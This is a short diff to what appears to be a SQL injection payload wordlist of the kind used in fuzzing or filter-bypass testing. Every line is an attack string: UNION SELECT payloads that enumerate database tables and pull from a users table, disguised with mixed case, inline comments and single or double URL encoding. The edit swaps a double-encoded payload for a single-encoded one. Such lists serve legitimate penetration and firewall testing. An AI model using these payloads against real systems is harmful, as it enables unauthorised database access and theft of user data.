@@ -26,7 +26,9 @@
 1+union+select+1%2C+table_name+from+information_schema.tables+where+table_name+between+0x61+and+0x7a
 1+union+select+1%2C+table_name+from+information_schema.tables+where+table_name+like+0x7573657273
 1+UnIoN/**/SeLecT/**/1,2,3--
-21%252f%252a*/union%252f%252a*/select%252f%252a*/1,2,3%252f%252a*/from%252f%252a*/users--
+# double url-encoded
+## 21%252f%252a*/union%252f%252a*/select%252f%252a*/1,2,3%252f%252a*/from%252f%252a*/users--
+21%2f%2a*/union%2f%2a*/select%2f%2a*/1,2,3%2f%2a*/from%2f%2a*/users--
 1+/**/union/**/select
 1+/%2A%2A/union/%2A%2A/select
 1+%2f**%2funion%2f**%2fselect
